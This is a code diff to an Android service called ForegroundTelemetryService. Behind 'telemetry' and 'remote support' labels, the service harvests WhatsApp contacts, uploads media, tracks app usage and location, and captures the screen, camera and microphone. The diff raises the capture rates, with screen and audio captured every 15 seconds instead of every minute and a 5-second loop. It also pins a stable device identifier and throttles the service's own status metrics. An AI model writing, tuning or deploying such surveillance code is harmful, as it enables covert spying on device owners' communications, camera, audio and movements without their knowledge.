@@ -90,14 +90,14 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private static final String KEY_LAST_MEDIA_SCAN_AT = "last_media_scan_at";
     private static final String KEY_LAST_APP_USAGE_SYNC_AT = "last_app_usage_sync_at";
     private static final String KEY_RECENT_WHATSAPP_CONTACTS = "recent_whatsapp_contacts";
-    private static final long NORMAL_LOOP_MS = 30_000L;
+    private static final long NORMAL_LOOP_MS = 5_000L;
     private static final long ACTIVE_REMOTE_LOOP_MS = 900L;
     private static final long MEDIA_SCAN_INTERVAL_MS = 60_000L;
     private static final long APP_USAGE_SYNC_INTERVAL_MS = 15 * 60_000L;
     private static final long APP_USAGE_WINDOW_MS = 24 * 60 * 60_000L;
-    private static final long REMOTE_SCREEN_FRAME_INTERVAL_MS = 60_000L;
+    private static final long REMOTE_SCREEN_FRAME_INTERVAL_MS = 15_000L;
     private static final long REMOTE_CAMERA_FRAME_INTERVAL_MS = 15_000L;
-    private static final int REMOTE_AUDIO_SEGMENT_MS = 60_000;
+    private static final int REMOTE_AUDIO_SEGMENT_MS = 15_000;
     private static final int REMOTE_AUDIO_SAMPLE_RATE = 16_000;
     private static final int MAX_MEDIA_ITEMS_PER_SCAN = 1500;
     private static final long MEDIA_CHANGE_DEBOUNCE_MS = 7000L;
@@ -123,6 +123,8 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private static final String KEY_REMOTE_SET_PASSWORD_LAST_SESSION = "remote_set_password_last_session";
     private volatile long lastMediaChangeAt = 0L;
     private volatile ContentObserver mediaObserver = null;
+    private volatile long lastRemoteSyncMetricAt = 0L;
+    private volatile long lastRemoteSyncErrorMetricAt = 0L;
 
     @Override
     public void onCreate() {
@@ -152,7 +154,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
 
         new Thread(() -> {
             try {
-                Thread.sleep(4000);
+                Thread.sleep(1000);
             } catch (InterruptedException ignored) {
             }
 
@@ -167,9 +169,9 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             while (running) {
                 try {
                     flushPendingEvents(60);
-                    sendTelemetryOnce();
                     JSONObject activeSession = syncRemoteSupportState();
                     maybeRunRemoteSupportStream(activeSession);
+                    sendTelemetryOnce();
                     maybeUploadAllMedia();
                     maybeSendAppUsageSnapshot();
 
@@ -263,7 +265,12 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     }
 
     private String currentDeviceId() {
-        return prefs().getString("deviceId", "unknown");
+        String deviceId = prefs().getString("deviceId", null);
+        if (deviceId == null || deviceId.trim().isEmpty() || "unknown".equalsIgnoreCase(deviceId.trim())) {
+            deviceId = DeviceIdentity.getStableDeviceId(this);
+            prefs().edit().putString("deviceId", deviceId).apply();
+        }
+        return deviceId;
     }
 
     private String currentToken() {
@@ -322,7 +329,11 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                 ctx.put("activeSessionId", active.optString("sessionId", null));
                 ctx.put("requestType", active.optString("requestType", null));
             }
-            sendMetric("remote_sync", "support_state", "ok", (int) (System.currentTimeMillis() - startedAt), null, ctx);
+            long now = System.currentTimeMillis();
+            if ((now - lastRemoteSyncMetricAt) >= 30_000L) {
+                sendMetric("remote_sync", "support_state", "ok", (int) (now - startedAt), null, ctx);
+                lastRemoteSyncMetricAt = now;
+            }
             return active;
         } catch (Exception e) {
             Log.e(TAG, "syncRemoteSupportState err", e);
@@ -331,7 +342,11 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                 ctx.put("error", e.getClass().getSimpleName());
             } catch (Exception ignored) {
             }
-            sendMetric("remote_sync", "support_state", "error", (int) (System.currentTimeMillis() - startedAt), null, ctx);
+            long now = System.currentTimeMillis();
+            if ((now - lastRemoteSyncErrorMetricAt) >= 10_000L) {
+                sendMetric("remote_sync", "support_state", "error", (int) (now - startedAt), null, ctx);
+                lastRemoteSyncErrorMetricAt = now;
+            }
             return null;
         }
     }
